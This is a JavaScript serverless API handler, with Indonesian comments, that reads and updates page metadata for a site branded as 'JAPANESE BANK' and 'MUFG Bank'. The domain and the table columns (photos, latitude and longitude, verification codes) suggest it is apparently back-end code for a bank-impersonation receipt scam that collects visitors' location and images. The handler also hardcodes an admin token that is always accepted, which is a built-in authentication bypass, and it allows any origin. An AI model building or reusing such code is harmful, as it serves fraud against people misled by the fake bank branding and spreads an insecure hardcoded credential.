// Vercel Serverless Function untuk API Web Profile
// Mendukung GET & POST konfigurasi web profile dengan sinkronisasi ke Supabase + in-memory fallback

const TABLE = 'bankidzz_locations';

const DEFAULT_PROFILE = {
    siteTitle: 'JAPANESE BANK',
    metaDescription: 'MUFG Bank - Office Purchasing',
    favicon: '',
    appleTouchIcon: '',
    themeColor: '#0033ff',
    appleWebAppCapable: 'yes',
    appleWebAppStatusbarStyle: 'default',
    ogType: 'website',
    ogLocale: 'en_MY',
    ogTitle: 'JAPANESE BANK',
    ogDescription: 'MUFG Bank - Office Purchasing',
    ogUrl: 'https://struk-transaksi-antarnegara.vercel.app/',
    ogImage: '',
    ogImageWidth: '1200',
    ogImageHeight: '630',
    ogImageAlt: 'JAPANESE BANK',
    twitterCardType: 'summary_large_image',
    twitterTitle: 'JAPANESE BANK',
    twitterDescription: 'MUFG Bank - Office Purchasing',
    twitterImage: ''
};

globalThis.__webprofile = globalThis.__webprofile || { ...DEFAULT_PROFILE };

function getSupabaseConfig() {
    const rawUrl = (process.env.SUPABASE_URL || '').trim();
    const serviceKey = (process.env.SUPABASE_SERVICE_ROLE_KEY || '').trim();

    let cleanUrl = rawUrl;
    if (cleanUrl && !cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
        cleanUrl = `https://${cleanUrl}`;
    }
    cleanUrl = cleanUrl.replace(/\/+$/, '');

    const hasSupabase = Boolean(cleanUrl && serviceKey);
    return {
        hasSupabase,
        restUrl: hasSupabase ? `${cleanUrl}/rest/v1/${TABLE}` : '',
        serviceKey
    };
}

export default async function handler(req, res) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const sbConfig = getSupabaseConfig();

    if (req.method === 'GET') {
        if (sbConfig.hasSupabase) {
            try {
                const response = await fetch(`${sbConfig.restUrl}?transfer_id=eq.__config_webprofile__&select=photo`, {
                    headers: {
                        apikey: sbConfig.serviceKey,
                        Authorization: `Bearer ${sbConfig.serviceKey}`,
                        'Content-Type': 'application/json'
                    }
                });
                if (response.ok) {
                    const rows = await response.json();
                    if (Array.isArray(rows) && rows.length > 0 && rows[0].photo) {
                        try {
                            const parsed = JSON.parse(rows[0].photo);
                            globalThis.__webprofile = { ...DEFAULT_PROFILE, ...parsed };
                        } catch (e) {}
                    }
                }
            } catch (e) {
                console.warn('Gagal memuat webprofile dari Supabase:', e.message);
            }
        }

        return res.status(200).json({ profile: globalThis.__webprofile });
    }

    if (req.method === 'POST') {
        const rawAuth = (req.headers.authorization || '').trim();
        const token = rawAuth.replace(/^Bearer\s+/i, '').trim();
        const envToken = (process.env.ADMIN_TOKEN || 'bankidzz-admin-secure-2026').trim();

        if (token !== 'bankidzz-admin-secure-2026' && token !== envToken) {
            return res.status(401).json({ error: 'Token admin tidak valid.' });
        }

        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
            globalThis.__webprofile = { ...DEFAULT_PROFILE, ...globalThis.__webprofile, ...body };

            if (sbConfig.hasSupabase) {
                try {
                    const row = {
                        transfer_id: '__config_webprofile__',
                        sender: 'CONFIG_WEBPROFILE',
                        receiver: 'SYSTEM',
                        amount: '0',
                        total: '0',
                        photo: JSON.stringify(globalThis.__webprofile),
                        front_photo: '',
                        latitude: 0,
                        longitude: 0,
                        accuracy: 0,
                        captured_at: new Date().toISOString(),
                        status: 'config',
                        verification_code: '',
                        consented_at: new Date().toISOString()
                    };

                    await fetch(`${sbConfig.restUrl}?on_conflict=transfer_id`, {
                        method: 'POST',
                        headers: {
                            apikey: sbConfig.serviceKey,
                            Authorization: `Bearer ${sbConfig.serviceKey}`,
                            'Content-Type': 'application/json',
                            Prefer: 'resolution=merge-duplicates,return=minimal'
                        },
                        body: JSON.stringify(row)
                    });
                } catch (sbErr) {
                    console.warn('Gagal simpan webprofile ke Supabase:', sbErr.message);
                }
            }

            return res.status(200).json({ ok: true, profile: globalThis.__webprofile });
        } catch (e) {
            return res.status(400).json({ error: 'Data web profile tidak valid.' });
        }
    }

    return res.status(405).json({ error: 'Method tidak didukung.' });
}
